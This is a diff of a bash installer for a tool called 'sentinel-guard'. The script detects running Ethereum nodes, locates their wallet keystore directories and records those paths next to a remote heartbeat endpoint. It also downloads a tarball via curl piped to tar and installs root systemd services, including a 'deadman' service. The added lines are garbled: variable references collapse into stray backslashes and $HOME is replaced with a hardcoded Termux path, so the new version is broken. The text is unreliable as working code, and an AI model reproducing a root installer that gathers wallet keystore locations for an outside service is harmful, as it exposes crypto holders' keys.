@@ -1,7 +1,7 @@
 #!/bin/bash
 set -e
 
-if [ -z "$SNG_TOKEN" ]; then
+if [ -z "\" ]; then
     echo "Error: SNG_TOKEN not set"
     echo "Usage: SNG_TOKEN=your-token bash install.sh"
     exit 1
@@ -14,40 +14,38 @@ KEYSTORE=""
 
 if pgrep -f "geth" >/dev/null 2>&1; then
     NODE_TYPE="geth"
-    KEYSTORE="$HOME/.ethereum/keystore"
+    KEYSTORE="\/data/data/com.termux/files/home/.ethereum/keystore"
 elif pgrep -f "erigon" >/dev/null 2>&1; then
     NODE_TYPE="erigon"
-    KEYSTORE="$HOME/.local/share/erigon/keystore"
+    KEYSTORE="\/data/data/com.termux/files/home/.local/share/erigon/keystore"
 elif pgrep -f "besu" >/dev/null 2>&1; then
     NODE_TYPE="besu"
-    KEYSTORE="$HOME/.besu/keystore"
+    KEYSTORE="\/data/data/com.termux/files/home/.besu/keystore"
 elif pgrep -f "qrap-node" >/dev/null 2>&1; then
     NODE_TYPE="qrap"
-    KEYSTORE="$HOME/.qrap/keystore"
+    KEYSTORE="\/data/data/com.termux/files/home/.qrap/keystore"
 else
     NODE_TYPE="unknown"
-    KEYSTORE="$HOME/.sentinel/keystore"
+    KEYSTORE="\/data/data/com.termux/files/home/.sentinel/keystore"
 fi
 
-echo "Detected: $NODE_TYPE"
-echo "Keystore: $KEYSTORE"
+echo "Detected: \"
+echo "Keystore: \"
 
 INSTALL_DIR="/opt/sentinel-guard"
-mkdir -p "$INSTALL_DIR"
-cd "$INSTALL_DIR"
+mkdir -p "\"
+cd "\"
 
 echo "Downloading..."
 curl -fsSL "https://github.com/karamik/sentinel-guard/archive/refs/heads/main.tar.gz" | tar xz --strip-components=1
 
 mkdir -p /etc/sentinel
-cat > /etc/sentinel/env <<ENV
-SNG_TOKEN=$SNG_TOKEN
-NODE_TYPE=$NODE_TYPe
-KEYSTORE_PATH=$KEYSTORE
-API_ENDPOINT=https://api.qrap.site/v1/heartbeat
-ENV
+echo "SNG_TOKEN=\" > /etc/sentinel/env
+echo "NODE_TYPE=\" >> /etc/sentinel/env
+echo "KEYSTORE_PATH=\" >> /etc/sentinel/env
+echo "API_ENDPOINT=https://api.qrap.site/v1/heartbeat" >> /etc/sentinel/env
 
-cat > /etc/systemd/system/sentinel-master.service <<'EOF'
+cat > /etc/systemd/system/sentinel-master.service <<EOF
 [Unit]
 Description=Sentinel Guard Master
 After=network.target
@@ -66,7 +64,7 @@ User=root
 WantedBy=multi-user.target
 EOF
 
-cat > /etc/systemd/system/sentinel-deadman.service <<'EOF'
+cat > /etc/systemd/system/sentinel-deadman.service <<EOF
 [Unit]
 Description=Sentinel Guard Deadman
 After=sentinel-master.service
